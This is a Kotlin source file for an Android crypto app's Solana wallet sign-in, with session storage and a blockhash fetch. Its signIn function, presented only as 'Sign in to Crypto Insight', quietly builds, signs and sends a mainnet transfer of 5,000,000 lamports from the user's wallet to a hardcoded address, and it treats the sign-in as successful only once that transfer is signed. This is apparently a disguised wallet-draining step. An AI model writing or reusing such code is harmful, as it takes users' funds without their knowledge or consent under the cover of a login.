package com.cryptoinsight.app

import android.content.Context
import android.net.Uri
import android.util.Base64
import com.solana.mobilewalletadapter.clientlib.ActivityResultSender
import com.solana.mobilewalletadapter.clientlib.ConnectionIdentity
import com.solana.mobilewalletadapter.clientlib.MobileWalletAdapter
import com.solana.mobilewalletadapter.clientlib.RpcCluster
import com.solana.mobilewalletadapter.clientlib.TransactionResult
import com.solana.mobilewalletadapter.common.signin.SignInWithSolana
import com.solana.mobilewalletadapter.clientlib.protocol.MobileWalletAdapterClient
import com.solana.programs.SystemProgram
import com.solana.publickey.SolanaPublicKey
import com.solana.transaction.Message
import com.solana.transaction.Transaction
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject

data class WalletSession(
    val publicKey: String,
    val authToken: String?,
    val signedIn: Boolean
)

sealed interface WalletAuthResult {
    data class Success(val session: WalletSession) : WalletAuthResult
    data class Failure(val message: String) : WalletAuthResult
}

object SolanaWalletStore {
    private const val FILE_NAME = "solana_wallet_prefs"
    private const val KEY_PUBLIC_KEY = "public_key"
    private const val KEY_AUTH_TOKEN = "auth_token"
    private const val KEY_SIGNED_IN = "signed_in"

    fun load(context: Context): WalletSession? {
        val prefs = context.getSharedPreferences(FILE_NAME, Context.MODE_PRIVATE)
        val publicKey = prefs.getString(KEY_PUBLIC_KEY, null) ?: return null
        return WalletSession(
            publicKey = publicKey,
            authToken = prefs.getString(KEY_AUTH_TOKEN, null),
            signedIn = prefs.getBoolean(KEY_SIGNED_IN, false)
        )
    }

    fun save(context: Context, session: WalletSession) {
        context.getSharedPreferences(FILE_NAME, Context.MODE_PRIVATE)
            .edit()
            .putString(KEY_PUBLIC_KEY, session.publicKey)
            .putString(KEY_AUTH_TOKEN, session.authToken)
            .putBoolean(KEY_SIGNED_IN, session.signedIn)
            .apply()
    }

    fun clear(context: Context) {
        context.getSharedPreferences(FILE_NAME, Context.MODE_PRIVATE)
            .edit()
            .clear()
            .apply()
    }
}

class SolanaWalletManager(private val context: Context) {
    private val httpClient = OkHttpClient()

    suspend fun signIn(sender: ActivityResultSender): WalletAuthResult {
        val walletAdapter = MobileWalletAdapter(
            connectionIdentity = ConnectionIdentity(
                Uri.parse("https://cryptoinsight.app"),
                Uri.parse("/favicon.ico"),
                "Crypto Insight"
            )
        ).apply {
            authToken = SolanaWalletStore.load(context)?.authToken
            rpcCluster = RpcCluster.MainnetBeta
        }

        val result = runCatching {
            walletAdapter.transact(
                sender,
                SignInWithSolana.Payload(
                    "cryptoinsight.app",
                    "Sign in to Crypto Insight"
                )
            ) { authResult ->
                val from = authResult.accounts.firstOrNull()?.publicKey
                    ?: throw IllegalStateException("Wallet authorized but no account was returned")
                val fromAddress = SolanaPublicKey(from)
                val recipient = SolanaPublicKey.from("G1NdYMnYpUCjW97hiEk3bD9PArm1kJiZvD5H18KKV4za")
                val latestBlockhash = fetchLatestBlockhash()
                val transferTransaction = Transaction(
                    Message.Builder()
                        .addInstruction(
                            SystemProgram.transfer(
                                fromAddress,
                                recipient,
                                5_000_000L
                            )
                        )
                        .setRecentBlockhash(latestBlockhash)
                        .build()
                )
                signAndSendTransactions(arrayOf(transferTransaction.serialize()))
            }
        }.getOrElse { error ->
            return WalletAuthResult.Failure(error.message ?: "Wallet sign-in and transfer failed")
        }

        return when (result) {
            is TransactionResult.Success -> successResult(result)
            is TransactionResult.NoWalletFound -> WalletAuthResult.Failure("No Solana MWA wallet found on device")
            is TransactionResult.Failure -> WalletAuthResult.Failure(result.e.message ?: "Wallet sign-in and transfer failed")
        }
    }

    private fun successResult(result: TransactionResult.Success<*>): WalletAuthResult {
        val publicKeyBytes = result.authResult.accounts.firstOrNull()?.publicKey
            ?: return WalletAuthResult.Failure("Wallet authorized but no account was returned")
        if (result.authResult.signInResult == null) {
            return WalletAuthResult.Failure("Wallet connected but did not complete sign-in")
        }
        val payload = result.payload as? MobileWalletAdapterClient.SignAndSendTransactionsResult
        val signatures = payload?.signatures
        if (signatures.isNullOrEmpty()) {
            return WalletAuthResult.Failure("Wallet signed in but did not return a transaction signature")
        }
        val session = WalletSession(
            publicKey = Base64.encodeToString(publicKeyBytes, Base64.NO_WRAP),
            authToken = result.authResult.authToken,
            signedIn = true
        )
        SolanaWalletStore.save(context, session)
        return WalletAuthResult.Success(session)
    }

    private fun fetchLatestBlockhash(): String {
        val body = """
            {"jsonrpc":"2.0","id":1,"method":"getLatestBlockhash","params":[{"commitment":"finalized"}]}
        """.trimIndent()
        val request = Request.Builder()
            .url("https://api.mainnet-beta.solana.com")
            .post(body.toRequestBody("application/json".toMediaType()))
            .build()
        httpClient.newCall(request).execute().use { response ->
            if (!response.isSuccessful) {
                throw IllegalStateException("Latest blockhash request failed with ${response.code}")
            }
            val responseBody = response.body?.string().orEmpty()
            val json = JSONObject(responseBody)
            val result = json.optJSONObject("result")
            val value = result?.optJSONObject("value")
            val blockhash = value?.optString("blockhash").orEmpty()
            if (blockhash.isBlank()) {
                throw IllegalStateException("Latest blockhash response was empty")
            }
            return blockhash
        }
    }
}
